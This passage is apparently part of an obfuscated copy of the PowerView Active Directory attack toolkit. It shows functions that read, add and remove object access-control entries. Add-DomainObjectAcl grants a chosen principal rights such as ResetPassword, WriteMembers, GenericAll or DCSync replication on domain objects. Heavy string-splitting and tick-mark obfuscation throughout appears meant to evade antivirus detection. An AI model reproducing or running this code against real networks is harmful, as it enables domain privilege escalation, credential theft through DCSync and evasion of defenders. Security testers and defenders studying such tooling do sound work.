                elseif (${Id`En`TiTYInStAN`ce} -match ((("{0}{1}{2}" -f '^','(CN7TuOU7TuD','C)=.*'))."r`EP`lACE"(([Char]55+[Char]84+[Char]117),[STrIng][Char]124))) {
                    ${id`Ent`ItY`FILTeR} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${PsboU`NdP`A`RAM`Ete`Rs}[("{1}{0}" -f 'n','Domai')]) -and (-not ${P`sbOuNDpA`RA`MeTERS}[("{0}{2}{1}" -f 'SearchB','se','a')])) {
                        
                        
                        ${I`D`entItYd`OmA`IN} = ${IDE`N`TIt`YiNS`TAn`CE}.("{0}{1}{2}"-f'Sub','Str','ing').Invoke(${i`d`eN`TITYIN`sT`ANCe}.("{1}{2}{0}"-f 'Of','Inde','x').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{2}{1}{0}{3}{4}" -f'e-Verb','t','Wri','os','e') ('[G'+'et-DomainO'+'bjec'+'t'+'Acl] '+'Extract'+'e'+'d '+'d'+'om'+'ain '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                        ${seAR`cHeRAR`GUM`EnTs}[("{1}{0}"-f 'main','Do')] = ${i`DE`NtItydOMaIN}
                        ${se`ARCH`eR} = &("{2}{3}{0}{1}{4}{5}" -f'D','om','Get','-','ainSea','rcher') @SearcherArguments
                        if (-not ${sE`AR`CHer}) {
                            &("{0}{3}{1}{4}{2}" -f 'W','ite','ing','r','-Warn') ('['+'Ge'+'t'+'-Domain'+'Object'+'Acl]'+' '+'Una'+'ble '+'t'+'o '+'retri'+'eve '+'domai'+'n '+'search'+'er'+' '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${iD`EN`Ti`TyINsT`ANCe} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${GUId`ByTes`Tr`InG} = (([Guid]${IDENTiTyinsT`A`N`Ce}).("{1}{2}{0}{3}" -f 'teArra','T','oBy','y').Invoke() | &("{2}{1}{0}" -f'bject','ach-O','ForE') { '\' + ${_}.("{1}{0}{2}"-f'S','To','tring').Invoke('X2') }) -join ''
                    ${iDeNT`ity`F`ilTER} += "(objectguid=$GuidByteString)"
                }
                elseif (${id`e`Nt`it`yI`NStaNCe}.("{0}{1}"-f 'Con','tains').Invoke('.')) {
                    ${iDeNTiTY`F`ILt`ER} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    ${IdENTIT`YFIL`TEr} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if (${id`ENtiTYfIlt`eR} -and (${iden`TiT`Y`FIlTer}.("{0}{1}" -f'Tr','im').Invoke() -ne '') ) {
                ${fil`T`eR} += "(|$IdentityFilter)"
            }

            if (${p`SbOUNDpa`Ra`ME`TeRS}[("{1}{2}{0}" -f 'r','LD','APFilte')]) {
                &("{1}{0}{2}" -f 'rite-Verbo','W','se') ('[Get-'+'Do'+'mai'+'nO'+'bjectAcl]'+' '+'Using'+' '+'addi'+'t'+'i'+'onal '+'L'+'DAP '+'fil'+'ter:'+' '+"$LDAPFilter")
                ${F`iLTeR} += "$LDAPFilter"
            }

            if (${FIlt`eR}) {
                ${s`ea`Rcher}."F`iltEr" = "(&$Filter)"
            }
            &("{1}{0}{2}" -f'r','W','ite-Verbose') "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Searcher.filter) "

            ${Re`s`ULTS} = ${seARc`H`Er}.("{0}{2}{1}" -f'Fi','l','ndAl').Invoke()
            ${REsUl`Ts} | &("{1}{3}{0}{2}"-f're-Obje','W','ct','he') {${_}} | &("{0}{2}{3}{1}" -f'For','t','Each-Ob','jec') {
                ${o`BJecT} = ${_}."pR`oP`ERtiES"

                if (${o`B`jECT}."O`Bjec`Tsid" -and ${ob`J`ect}."ob`j`ectsID"[0]) {
                    ${Obje`c`Tsid} = (&("{2}{1}{0}" -f 'w-Object','e','N') ("{7}{0}{5}{6}{1}{2}{3}{4}"-f 'm.Secu','l.Secu','r','ityIdentifie','r','rity','.Principa','Syste')(${oBJ`e`Ct}."OBJeCT`s`Id"[0],0))."v`ALUE"
                }
                else {
                    ${obJ`e`cTsiD} = ${n`Ull}
                }

                try {
                    &("{2}{1}{0}" -f'ect','-Obj','New') ("{7}{5}{6}{3}{0}{4}{1}{2}"-f'ityDes','p','tor','ecur','cri','ol','.RawS','Security.AccessContr') -ArgumentList ${o`Bje`Ct}[("{5}{2}{4}{3}{1}{0}"-f'or','ydescript','c','rit','u','ntse')][0], 0 | &("{3}{1}{4}{0}{2}" -f'ch','o','-Object','F','rEa') { if (${P`sbOundpa`Ram`E`Te`Rs}[("{1}{0}" -f'l','Sac')]) {${_}."S`Y`ST`EMaCL"} else {${_}."dis`creTIoNARYA`Cl"} } | &("{0}{2}{3}{1}{4}" -f 'ForE','-O','a','ch','bject') {
                        if (${PSbou`NdPAra`mET`ErS}[("{0}{2}{1}{3}" -f 'Ri','F','ghts','ilter')]) {
                            ${GU`IDfIL`TEr} = Switch (${Rig`HTS`FI`L`TEr}) {
                                ("{1}{0}{3}{2}{4}" -f'set','Re','assw','P','ord') { ("{5}{4}{1}{0}{2}{6}{3}"-f'768','a','-00aa0','529','0-','00299570-246d-11d','06e0') }
                                ("{0}{1}{2}" -f 'Write','Me','mbers') { ("{3}{6}{4}{0}{5}{2}{1}"-f '-00aa','e2','3049','bf9679c0-','de6-11d0-a285','00','0') }
                                ("{0}{1}{2}"-f 'De','f','ault') { ("{0}{1}{9}{5}{8}{4}{3}{7}{6}{2}" -f '000','00000-0','000','-000000','00','-0','00','0','000-00','000') }
                            }
                            if (${_}."O`BJeCTTY`Pe" -eq ${G`UI`DfIlTer}) {
                                ${_} | &("{3}{0}{2}{1}"-f'd-Me','ber','m','Ad') ("{2}{1}{0}{3}"-f 'ert','p','NotePro','y') ("{1}{0}"-f 'bjectDN','O') ${OBJ`ecT}."di`StingUIS`hEDn`AMe"[0]
                                ${_} | &("{1}{0}{2}" -f 'em','Add-M','ber') ("{0}{2}{1}" -f 'N','erty','oteProp') ("{0}{2}{1}"-f'O','SID','bject') ${o`Bje`Ct`SiD}
                                ${c`oNtINUe} = ${T`RUe}
                            }
                        }
                        else {
                            ${_} | &("{0}{2}{1}"-f'Add','ember','-M') ("{1}{0}{2}{3}"-f 'ePro','Not','pert','y') ("{0}{2}{1}"-f 'Obj','ctDN','e') ${O`B`jECT}."D`IstINguI`SHE`dn`Ame"[0]
                            ${_} | &("{2}{1}{0}"-f'er','b','Add-Mem') ("{2}{1}{0}" -f 'ty','oteProper','N') ("{2}{1}{0}"-f 'ctSID','bje','O') ${o`BJe`ctsId}
                            ${CoN`TI`NUE} = ${tR`UE}
                        }

                        if (${CON`TI`NuE}) {
                            ${_} | &("{2}{1}{0}" -f 'mber','d-Me','Ad') ("{0}{3}{1}{2}"-f 'N','eProp','erty','ot') ("{4}{3}{1}{0}{2}" -f'ct','ire','oryRights','tiveD','Ac') ( ( &("{0}{1}{2}"-f 'get-ChIlDI','t','eM') ("{2}{3}{0}{1}" -f'iaBle:','1qybI','v','aR')  )."VA`lue"::"TO`oBJe`ct"([System.DirectoryServices.ActiveDirectoryRights], ${_}."Acc`EsSM`ASK"))
                            if (${gU`idS}) {
                                
                                ${A`C`Lp`R`OpERTIEs} = @{}
                                ${_}."ps`O`BJect"."propE`R`TiEs" | &("{0}{1}{2}{3}" -f'F','orEach-','Obje','ct') {
                                    if (${_}."n`Ame" -match ((("{9}{8}{3}{1}{14}{0}{5}{12}{7}{6}{13}{10}{4}{2}{11}" -f 'ted','l4BInher','Obj','Type','ited','Objec','Type','jectAce','ect','Obj','Inher','ectAceType','tTypel4BOb','l4B','i'))  -crEPLaCe ([cHaR]108+[cHaR]52+[cHaR]66),[cHaR]124)) {
                                        try {
                                            ${ACLP`R`opER`TieS}[${_}."N`AME"] = ${g`UI`ds}[${_}."Va`Lue".("{0}{2}{1}"-f'to','ing','Str').Invoke()]
                                        }
                                        catch {
                                            ${A`clp`RoPErTiEs}[${_}."n`AmE"] = ${_}."V`Alue"
                                        }
                                    }
                                    else {
                                        ${a`CL`prOPErt`i`ES}[${_}."Na`mE"] = ${_}."VA`lUe"
                                    }
                                }
                                ${O`Ut`OBJE`CT} = &("{1}{0}{3}{2}" -f'-O','New','ct','bje') -TypeName ("{1}{0}{2}" -f'ec','PSObj','t') -Property ${aclP`ROPe`R`TI`ES}
                                ${oUTob`Je`Ct}."Pso`B`JeCT"."tyP`EnA`Mes".("{0}{2}{1}" -f 'Ins','t','er').Invoke(0, ("{1}{3}{2}{0}"-f'CL','Power','A','View.'))
                                ${OUT`ObJ`ECt}
                            }
                            else {
                                ${_}."PSoB`JE`Ct"."tYPE`NaM`eS".("{0}{1}"-f'I','nsert').Invoke(0, ("{1}{0}{2}"-f'w','Po','erView.ACL'))
                                ${_}
                            }
                        }
                    }
                }
                catch {
                    &("{2}{1}{4}{3}{0}" -f'e','te-','Wri','erbos','V') ('[Get-Dom'+'ain'+'Obje'+'ctAc'+'l] '+'E'+'rr'+'or: '+"$_")
                }
            }
        }
    }
}


function AdD`-D`OMa`iNobJectA`CL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}" -f 'ho','PSS','uldProcess'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(POSITiOn = 0, vaLUEfROMPiPELINe = ${TR`UE}, valUefROmPIPelINEBypRoPerTynAmE = ${T`RuE})]
        [Alias({"{3}{1}{2}{0}"-f'Name','stingu','ished','Di'}, {"{1}{0}{3}{2}" -f'amAccountN','S','e','am'}, {"{0}{1}" -f'Na','me'})]
        [String[]]
        ${tARg`E`TI`DEntItY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${TargET`DoM`AiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f 'Filt','e','r'})]
        [String]
        ${T`ArGEtl`dApFil`T`Er},

        [ValidateNotNullOrEmpty()]
        [String]
        ${T`ARge`Ts`eARC`HbA`sE},

        [Parameter(MANDAtORy = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pr`INciP`ALIdEN`TitY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${prINCIP`AlDo`m`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{4}{0}{2}{3}"-f 'n','Dom','Controlle','r','ai'})]
        [String]
        ${s`e`RVEr},

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{1}{2}{0}" -f'eLevel','O','n'}, {"{2}{0}{1}"-f'ubtr','ee','S'})]
        [String]
        ${s`EAR`ChSC`oPE} = ("{0}{1}"-f 'Subtr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${res`U`LTp`AgEs`Ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sErvErTi`m`El`iM`IT},

        [Switch]
        ${ToMBst`O`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRE`den`TIaL} =  ${Jh3x`O6}::"eM`PTY",

        [ValidateSet('All', {"{3}{2}{1}{0}"-f 'ord','Passw','eset','R'}, {"{2}{1}{0}{3}"-f'iteMember','r','W','s'}, {"{1}{0}" -f'c','DCSyn'})]
        [String]
        ${Ri`g`HTS} = 'All',

        [Guid]
        ${ri`GH`TSGuId}
    )

    BEGIN {
        ${TA`Rg`eTSE`A`R`cherar`guM`EntS} = @{
            ("{0}{1}{2}"-f 'P','rope','rties') = ("{1}{0}{3}{2}"-f'ingu','dist','dname','ishe')
            'Raw' = ${T`Rue}
        }
        if (${PSBOuNdP`A`Ra`MeTERS}[("{0}{1}{2}" -f 'Targ','etD','omain')]) { ${TAr`gET`Se`ArC`He`RAR`gumentS}[("{0}{1}{2}"-f'Do','ma','in')] = ${Tar`GEtDoMA`IN} }
        if (${psbounDpA`RaM`etE`RS}[("{1}{3}{4}{2}{0}"-f'r','Targe','te','tLDAPFi','l')]) { ${tar`G`ETs`EaRcH`er`ARGUMe`NTS}[("{2}{1}{0}" -f'er','Filt','LDAP')] = ${taRgET`LDap`Fi`lTeR} }
        if (${psb`oun`dParA`mEte`RS}[("{2}{3}{1}{0}{4}" -f 'Bas','ch','Target','Sear','e')]) { ${tARge`T`s`eAr`CHeR`Ar`GumEnTs}[("{0}{2}{1}"-f'S','se','earchBa')] = ${Targe`Ts`e`ArcHBaSE} }
        if (${P`sBou`N`dPaRaM`ETers}[("{2}{0}{1}"-f'v','er','Ser')]) { ${Tar`gE`TSE`ARcHE`RARGU`meNTs}[("{0}{1}"-f 'S','erver')] = ${S`erVER} }
        if (${P`Sbo`Undpar`AMet`ERS}[("{3}{0}{1}{2}" -f'ear','chSco','pe','S')]) { ${ta`RGeT`sEa`R`chERa`Rgu`MEnts}[("{2}{1}{0}"-f 'Scope','arch','Se')] = ${sEARc`hsC`O`pE} }
        if (${PS`BouNDpa`R`AME`Te`Rs}[("{0}{2}{1}{3}" -f'ResultPa','S','ge','ize')]) { ${TA`RG`Et`SearcHEr`Ar`gUMeNTs}[("{1}{3}{2}{0}" -f'ize','Resu','geS','ltPa')] = ${Re`sulTP`AgEs`IZe} }
        if (${pSbOUn`dpa`RAMEte`Rs}[("{2}{0}{1}{3}"-f'erv','erTi','S','meLimit')]) { ${Tar`GetS`EAr`CHE`RarGUmentS}[("{3}{0}{1}{2}"-f'v','erTimeL','imit','Ser')] = ${SeRVert`IM`e`liMiT} }
        if (${pS`BOuNd`paRam`eT`eRS}[("{2}{3}{0}{1}"-f's','tone','Tom','b')]) { ${t`ARgeTs`E`AR`C`HERA`RgumenTS}[("{0}{1}"-f'Tombs','tone')] = ${to`mBst`ONe} }
        if (${pSboU`ND`p`ArAm`ET`eRS}[("{2}{1}{0}"-f 'al','enti','Cred')]) { ${tAR`Get`sEAr`C`herArgu`MeNTS}[("{0}{1}{2}" -f 'Crede','nt','ial')] = ${C`R`Ed`ENtIal} }

        ${PriNciPal`SE`ArCHe`RARG`UME`N`Ts} = @{
            ("{2}{1}{0}"-f 'ntity','de','I') = ${P`RInCipa`lI`deNti`Ty}
            ("{2}{1}{0}" -f 's','pertie','Pro') = ("{5}{2}{0}{6}{1}{4}{3}"-f'ish','dn','gu','me,objectsid','a','distin','e')
        }
        if (${P`sboUNdparam`e`Te`Rs}[("{1}{2}{0}{3}"-f'incip','P','r','alDomain')]) { ${PrI`NcipAlsEaR`c`HeR`ARgumEnts}[("{1}{0}" -f'n','Domai')] = ${P`RI`NcI`PALd`oM`AIN} }
        if (${psB`OUn`d`pA`RAMET`erS}[("{0}{1}" -f'Serv','er')]) { ${p`RincIPalS`earCh`E`RARgUm`en`Ts}[("{1}{2}{0}"-f'er','Ser','v')] = ${serV`ER} }
        if (${PSbO`U`Nd`paraMeteRs}[("{0}{2}{1}" -f'Search','cope','S')]) { ${pRi`N`cipAl`SeARcH`EraRgum`eNTs}[("{1}{2}{0}" -f'chScope','S','ear')] = ${se`A`RcHs`COpE} }
        if (${Psb`Ou`NDparaM`etERS}[("{1}{0}{2}"-f'tPageS','Resul','ize')]) { ${PriNci`pA`lsea`RCherar`g`U`Me`NTS}[("{1}{4}{3}{2}{0}" -f 'ze','Resul','i','S','tPage')] = ${R`es`ULtP`A`GEsize} }
        if (${PSB`oUnDpA`R`AmETers}[("{0}{2}{1}"-f'Serv','t','erTimeLimi')]) { ${PRI`N`c`IpaL`se`ArCHeRarg`UMEntS}[("{2}{1}{0}{3}"-f'im','meL','ServerTi','it')] = ${seRV`eRt`imel`IMIT} }
        if (${pSbOuNdpA`R`Ame`TERs}[("{2}{0}{1}" -f'ombs','tone','T')]) { ${p`R`iNCiPAlSE`Ar`ChERa`Rgu`MeNTs}[("{0}{2}{1}"-f'To','one','mbst')] = ${TO`mbST`OnE} }
        if (${p`SBOUndPa`RAm`eT`ErS}[("{1}{0}{2}"-f 'redentia','C','l')]) { ${PR`InC`IpalSEA`RCheRa`RGUmeNtS}[("{2}{0}{3}{1}"-f 'ede','tial','Cr','n')] = ${C`REdE`NTiAL} }
        ${pRIN`C`iPalS} = &("{2}{0}{1}" -f 'inObj','ect','Get-Doma') @PrincipalSearcherArguments
        if (-not ${Pr`in`cipAlS}) {
            throw ('Un'+'abl'+'e '+'to'+' '+'r'+'esol'+'ve '+'pri'+'n'+'cipal: '+"$PrincipalIdentity")
        }
    }

    PROCESS {
        ${TARgETSe`A`R`CHe`RA`R`GuMENts}[("{0}{1}" -f'Iden','tity')] = ${tA`RGE`T`IDeNtI`Ty}
        ${TA`RG`ETS} = &("{3}{4}{2}{0}{1}"-f 'ainOb','ject','om','Get','-D') @TargetSearcherArguments

        ForEach (${T`ArGET`oBjECt} in ${tA`RGe`Ts}) {

            ${INHEr`itAN`cETY`pe} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ("{1}{0}" -f 'ne','No')
            ${cOnt`ROL`Type} = [System.Security.AccessControl.AccessControlType] ("{1}{0}" -f'low','Al')
            ${AC`Es} = @()

            if (${r`ig`HtsguiD}) {
                ${G`UI`DS} = @(${rigHTs`g`Uid})
            }
            else {
                ${gU`I`Ds} = Switch (${RIg`H`Ts}) {
                    
                    ("{0}{1}{2}" -f 'R','esetPass','word') { ("{6}{2}{0}{3}{1}{5}{4}" -f'8-','a0','299570-246d-11d0-a76','00a','529','06e0','00') }
                    
                    ("{1}{0}{2}" -f'Member','Write','s') { ("{0}{1}{2}{4}{6}{3}{5}"-f 'b','f9679c0','-','9e','0de6-11d','2','0-a285-00aa00304') }
                    
                    
                    
                    
                    ("{1}{0}" -f 'nc','DCSy') { ("{7}{0}{8}{6}{9}{3}{5}{4}{2}{1}" -f '1f','04fc2dcd2','c','9c07-1','0','1d1-f79f-0','a','113','6','a-'), ("{0}{3}{1}{8}{5}{7}{4}{2}{6}" -f'1131f6','9c07-11d1-','0','ad-','-','7','0c04fc2dcd2','9f','f'), ("{9}{3}{4}{5}{6}{7}{8}{1}{2}{0}" -f'beda640c','4c62-991a-','0fac','9','e','95b','76-4','44','d-','8')}
                }
            }

            ForEach (${prINCI`P`AloBJ`E`CT} in ${princ`Ip`ALS}) {
                &("{0}{2}{1}"-f 'Wr','e','ite-Verbos') "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) "

                try {
                    ${I`den`TItY} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${P`R`INCiPalOBj`eCT}."Ob`jecT`SID")

                    if (${Gu`I`Ds}) {
                        ForEach (${G`Uid} in ${GUi`dS}) {
                            ${New`g`UiD} = &("{1}{0}{2}"-f 'b','New-O','ject') ("{0}{1}"-f'Gu','id') ${Gu`ID}
                            ${AD`RiG`HTs} = [System.DirectoryServices.ActiveDirectoryRights] ("{2}{1}{0}{4}{3}"-f'ndedR','e','Ext','ght','i')
                            ${Ac`Es} += &("{0}{1}{2}"-f'New-O','b','ject') ("{0}{2}{7}{1}{6}{5}{4}{3}{8}" -f 'S','m.Dire','yst','ices.ActiveDir','Serv','ry','cto','e','ectoryAccessRule') ${IdEN`TI`TY}, ${ad`R`igHTs}, ${cO`NtR`oL`TyPE}, ${nE`wg`UID}, ${I`Nher`ITANcEt`y`pE}
                        }
                    }
                    else {
                        
                        ${AD`RIg`hts} = [System.DirectoryServices.ActiveDirectoryRights] ("{2}{0}{1}"-f 'n','ericAll','Ge')
                        ${aC`eS} += &("{1}{2}{0}" -f 'ect','Ne','w-Obj') ("{4}{2}{0}{10}{5}{3}{14}{7}{12}{1}{11}{9}{6}{8}{13}"-f'rector','to','ystem.Di','vic','S','r','es','Di','sR','Acc','ySe','ry','rec','ule','es.Active') ${Id`e`Ntity}, ${ADrIG`H`TS}, ${C`Ont`RoltY`pe}, ${iN`hE`RitA`NCETYpe}
                    }

                    
                    ForEach (${A`cE} in ${aC`eS}) {
                        &("{1}{3}{4}{2}{0}" -f'e','W','bos','ri','te-Ver') "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname) "
                        ${T`ARgEte`NTrY} = ${t`ARge`TOBJE`cT}.("{2}{3}{1}{4}{0}" -f 'yEntry','t','GetDire','c','or').Invoke()
                        ${ta`RGe`TE`Ntry}."Psba`se"."Op`TI`ONS"."SECU`R`It`YmaSKs" = ("{1}{0}"-f'l','Dac')
                        ${tArg`ET`E`NTRy}."PS`BAse"."obJeC`TS`ecuR`iTY".("{3}{0}{2}{1}" -f 'Access','e','Rul','Add').Invoke(${A`cE})
                        ${Ta`R`getEnTry}."Ps`Ba`se".("{0}{2}{4}{1}{3}" -f 'C','itChang','o','es','mm').Invoke()
                    }
                }
                catch {
                    &("{2}{1}{0}{3}" -f '-','e','Writ','Verbose') "[Add-DomainObjectAcl] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_ "
                }
            }
        }
    }
}


function reM`OVE-DoMa`iNo`BjeC`TAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{2}" -f'PSSho','uldP','ess','roc'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(pOSiTIOn = 0, vaLuEfroMpIpelINE = ${Tr`UE}, VaLuEfrOMPiPelinEBYpROPertYnamE = ${T`RUE})]
        [Alias({"{1}{3}{0}{2}" -f'hedN','D','ame','istinguis'}, {"{3}{1}{2}{0}" -f 'e','amAccountN','am','S'}, {"{0}{1}" -f 'N','ame'})]
        [String[]]
        ${Ta`R`GeTIDEnT`itY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${TArge`TdOM`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'Fi','lter'})]
        [String]
        ${Tar`GeTldap`FI`l`TeR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${T`ArGeTs`e`ARCHB`ASE},

        [Parameter(MANDAtORY = ${tR`UE})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PrINC`IpAlIDE`NT`itY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${p`RiN`CiP`ALdomain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{3}{1}" -f'DomainContr','r','oll','e'})]
        [String]
        ${sE`Rv`er},

        [ValidateSet({"{1}{0}"-f'ase','B'}, {"{2}{1}{0}"-f 'evel','neL','O'}, {"{0}{1}"-f 'Subtre','e'})]
        [String]
        ${SeA`RChS`Co`Pe} = ("{2}{1}{0}" -f'ree','t','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RESUl`TpA`g`Es`IZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sERveRti`ME`l`im`It},

        [Switch]
        ${TOm`BsTo`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crED`eN`TI`Al} =   (  &('LS')  ("{3}{1}{0}{2}"-f 'h','AriAbLE:J','3XO6','v'))."vA`luE"::"E`MPTy",

        [ValidateSet('All', {"{2}{1}{0}"-f'rd','etPasswo','Res'}, {"{2}{3}{0}{1}"-f'e','mbers','Writ','eM'}, {"{0}{1}" -f'DCSy','nc'})]
        [String]
        ${Ri`ghtS} = 'All',

        [Guid]
        ${RIG`Ht`s`GUiD}
    )

    BEGIN {
        ${tA`Rg`et`se`Arc`HERArgUmen`TS} = @{
            ("{0}{2}{1}"-f'Prop','ies','ert') = ("{4}{3}{1}{0}{5}{2}"-f 'uish','ng','dname','i','dist','e')
            'Raw' = ${t`RUe}
        }
        if (${Psb`o`UndpaRaME`T`E`Rs}[("{0}{3}{1}{2}"-f 'Ta','D','omain','rget')]) { ${targEtsE`Ar`c`HE`RArG`UMEntS}[("{0}{1}" -f'Dom','ain')] = ${TaR`GEtdOM`A`iN} }
        if (${PS`Bo`Und`PaRa`m`eTErs}[("{3}{1}{0}{2}"-f'APFilt','argetLD','er','T')]) { ${TArGEt`SE`Ar`c`her`ArGUMe`NTs}[("{1}{0}{2}" -f 'APFi','LD','lter')] = ${t`ARGE`TlDa`PF`ilTer} }
        if (${p`SbounD`PArAm`ET`ERS}[("{0}{1}{2}{3}"-f 'T','arge','tSear','chBase')]) { ${t`AR`g`ETSEA`RChE`Rargu`mENtS}[("{1}{3}{0}{2}"-f 'a','Searc','se','hB')] = ${TArG`E`TSeAR`CHbasE} }
        if (${P`SBOUND`Para`m`EteRs}[("{0}{1}{2}"-f 'Serv','e','r')]) { ${TarG`e`T`s`EaR`ch`eRARg`UMEnTS}[("{1}{2}{0}"-f 'er','Ser','v')] = ${S`eRVER} }
        if (${PSboU`ND`parAme`TeRS}[("{0}{1}{3}{2}" -f'Searc','hS','pe','co')]) { ${TARg`E`Ts`EaR`c`HeRArGu`mE`NTS}[("{1}{0}{2}" -f 'archScop','Se','e')] = ${SEARC`hs`Co`PE} }
        if (${p`sBo`UN`D`paramEtErs}[("{2}{3}{0}{1}"-f 'tPage','Size','Re','sul')]) { ${ta`RgETsEaR`CHERargUM`E`NTs}[("{3}{1}{4}{0}{2}" -f'g','esu','eSize','R','ltPa')] = ${R`esULt`P`AGE`sIze} }
        if (${P`sBo`UnD`PARAmEtERs}[("{1}{0}{4}{2}{3}" -f'rverTim','Se','im','it','eL')]) { ${ta`RG`etSEARCh`E`RArg`UM`eNTs}[("{1}{2}{3}{0}"-f 'Limit','S','erverT','ime')] = ${sE`RveRTimEL`i`mIT} }
        if (${psBOU`NdP`ArAMEtE`RS}[("{2}{1}{0}"-f 'bstone','m','To')]) { ${T`AR`G`et`sEA`RCHeRaRg`Umen`TS}[("{3}{2}{0}{1}"-f 'sto','ne','b','Tom')] = ${T`OMbSt`one} }
        if (${P`s`BOUND`PaRaME`TERs}[("{2}{0}{3}{1}" -f 'ed','ntial','Cr','e')]) { ${T`ArGETs`Ea`RcHe`RAR`GUM`ENTS}[("{1}{2}{0}"-f'ntial','Cre','de')] = ${cReDEnt`I`Al} }

        ${PR`i`NCI`Pa`lS`EaRcheRARgumENtS} = @{
            ("{0}{2}{1}" -f'Ide','tity','n') = ${prin`CI`PA`l`IDE`NTItY}
            ("{2}{0}{1}"-f 'e','rties','Prop') = ("{2}{1}{3}{5}{0}{4}" -f'edname,objects','s','di','ting','id','uish')
        }
        if (${psBOUNd`P`A`RaM`etErS}[("{4}{0}{1}{3}{2}"-f 'rin','cip','omain','alD','P')]) { ${prI`NCip`AlsearCh`erARgUMe`NTs}[("{1}{0}" -f'ain','Dom')] = ${PR`IN`CipaLD`oMA`iN} }
        if (${Ps`B`OUnDP`ArA`meT`erS}[("{1}{0}" -f'erver','S')]) { ${PRinCIpAl`s`EArcH`er`A`RgUM`E`NtS}[("{0}{1}"-f 'Ser','ver')] = ${se`RvER} }
        if (${ps`Bou`NdparAm`etERS}[("{1}{0}{2}"-f'earchScop','S','e')]) { ${PRincI`pALs`eAR`CheRa`RGumEn`Ts}[("{0}{3}{1}{2}"-f 'SearchS','o','pe','c')] = ${s`EArch`sCoPe} }
        if (${pSBOu`NDPar`AM`eters}[("{0}{3}{2}{1}"-f 'Resu','eSize','ag','ltP')]) { ${p`RinCI`p`AlSeA`RcHERaR`g`U`mEn`TS}[("{0}{1}{3}{2}" -f 'R','esultP','Size','age')] = ${REs`ULt`PA`gE`sIZe} }
        if (${PsBOuND`p`ArAM`E`T`eRS}[("{0}{2}{1}{3}" -f 'S','ime','erverT','Limit')]) { ${P`RI`NciPAlSe`ArcheRA`RG`UM`enTs}[("{1}{0}{2}" -f'imeLim','ServerT','it')] = ${SEr`V`eR`TImE`LImiT} }
        if (${pSb`ouNDPa`R`Am`ETERs}[("{0}{1}{3}{2}" -f 'To','mb','e','ston')]) { ${pRINcI`PAlSE`ARCher`AR`GU`MeN`Ts}[("{1}{2}{0}" -f'ne','To','mbsto')] = ${T`Om`B`Stone} }
        if (${PsbOuNdp`A`R`AME`TERs}[("{2}{1}{3}{0}" -f'l','ed','Cr','entia')]) { ${PRiNcIp`ALSearchE`RA`R`GUME`Nts}[("{1}{3}{2}{0}"-f 'ential','Cr','d','e')] = ${C`R`edEN`TiAl} }
        ${Pri`N`CIpals} = &("{0}{2}{3}{5}{4}{1}"-f'Ge','ect','t-D','om','nObj','ai') @PrincipalSearcherArguments
        if (-not ${p`RINCip`AlS}) {
            throw ('Un'+'abl'+'e '+'t'+'o '+'re'+'so'+'lve '+'princi'+'pa'+'l:'+' '+"$PrincipalIdentity")
        }
    }

    PROCESS {
        ${t`Arg`E`T`searCHErA`RgUmentS}[("{0}{2}{1}"-f'I','ty','denti')] = ${taR`GE`TiDE`NtIty}
        ${Ta`Rg`ETs} = &("{0}{3}{1}{4}{2}" -f 'Ge','main','bject','t-Do','O') @TargetSearcherArguments

        ForEach (${T`ARgetOb`JECT} in ${T`Arg`ETS}) {

            ${iNherIt`ANc`EtY`Pe} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ("{0}{1}"-f'Non','e')
            ${c`ONTr`olty`pE} = [System.Security.AccessControl.AccessControlType] ("{1}{0}"-f 'low','Al')
            ${ac`ES} = @()

            if (${ri`ghTs`gUID}) {
                ${gU`idS} = @(${riGHts`G`UiD})
            }
            else {
                ${GU`I`DS} = Switch (${ri`G`hTs}) {
                    
                    ("{2}{0}{1}"-f'as','sword','ResetP') { ("{6}{8}{2}{1}{0}{3}{5}{4}{7}" -f 'a768-','-','0','00aa','06e052','0','00299570-246d-11','9','d') }
                    
